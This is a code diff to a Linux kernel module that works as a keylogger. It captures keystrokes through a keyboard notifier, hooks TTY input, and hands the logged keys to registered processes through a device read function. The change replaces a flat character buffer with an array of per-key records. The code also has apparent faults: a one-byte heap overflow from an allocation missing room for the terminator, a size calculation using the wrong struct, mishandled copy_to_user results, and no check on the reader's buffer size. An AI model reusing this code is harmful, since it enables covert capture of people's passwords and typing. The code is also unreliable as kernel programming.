@@ -26,12 +26,22 @@
 #define TTY_MAJOR 66
 #define TTY_NAME "ttylog"
 
+#define MAX_KEYS_TO_BUFFER 1024
 #define KEYLOG_BUF_SIZE 1024
 #define MAX_REGISTERED_PROCS 5
 
 MODULE_LICENSE( "Dual BSD/GPL" );
 
-static char *key_buffer = NULL, *tty_buffer = NULL, *pid_buffer = NULL;
+struct logged_key {
+    char *name;
+    int code;
+    unsigned int name_len;
+};
+
+static struct logged_key *key_buffer;
+static unsigned int num_keys_logged = 0;
+
+static char *tty_buffer = NULL, *pid_buffer = NULL;
 static int cur_buf_length = 0;
 static int cur_ttybuf_length = 0;
 static pid_t registered_pids[MAX_REGISTERED_PROCS];
@@ -126,16 +136,29 @@ ssize_t key_write( struct file *filp, const char *buf, size_t count, loff_t *f_p
 
 ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
     int err = 0;
+    int i;
+    struct logged_key *curr = NULL;
 
     if ( *f_pos == 0 ) {
-        err = copy_to_user( buf, key_buffer, cur_buf_length );
-        if ( err < 0 ) {
-            print812( "Copying to user failed (%d)", err );
-            return err;
+        for ( i = 0; i < num_keys_logged; i++ ) {
+            curr = &key_buffer[i];
+
+            err = copy_to_user( buf + *f_pos, curr->name, curr->name_len );
+            if ( err < 0 ) {
+                print812( "Copying to user failed (%d)", err );
+                return err;
+            }
+
+            // Free the key
+            *f_pos += curr->name_len;
+            kfree( curr->name );
+            curr->name = NULL;
+            curr->name_len = 0;
+            curr->code = -1;
         }
 
-        *f_pos = cur_buf_length;
-        cur_buf_length = 0; // Reset buf length to read more content
+        num_keys_logged = 0;
+
         return *f_pos;
     } else {
         return 0;
@@ -241,7 +264,9 @@ void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, 
 
 int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
-    char *key_name = NULL; 
+    char *key_name = NULL;
+    unsigned int name_len = 0;
+    struct logged_key *next_key = NULL;
 
     if ( code == KBD_KEYCODE ) {
         // Process and skip key buffering for meta keys
@@ -250,11 +275,22 @@ int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param
         }
 
         if ( param->down && registered_proc_count ) {
-            
-            key_name = GET_KEYNAME( param->value );
+            if ( num_keys_logged < MAX_KEYS_TO_BUFFER ) {
+                key_name = GET_KEYNAME( param->value );
+                name_len = strlen( key_name );
+                next_key = &key_buffer[num_keys_logged];
 
-            if ( strlen( key_name ) + cur_buf_length < KEYLOG_BUF_SIZE ) {
-                cur_buf_length += sprintf( key_buffer + cur_buf_length, "%s", key_name );
+                next_key->name = kzalloc( name_len, GFP_KERNEL );
+                if ( next_key->name == NULL ) {
+                    print812( "Failed to allocate key name buffer - skipping key '%s'", key_name );
+                    return NOTIFY_OK;
+                }
+                next_key->name_len = name_len;
+                next_key->code = param->value;
+
+                sprintf( next_key->name, "%s", key_name );
+
+                num_keys_logged++;
             }
         }
     }
@@ -301,7 +337,7 @@ static int hello_init( void ) {
         return err;
     }
 
-    key_buffer = kzalloc( sizeof(char) * KEYLOG_BUF_SIZE, GFP_KERNEL );
+    key_buffer = kzalloc( sizeof(struct key) * MAX_KEYS_TO_BUFFER, GFP_KERNEL );
     if ( !key_buffer ) {
         err = -ENOMEM;
         print812( "Failed to allocate keybuffer (%d)", err );
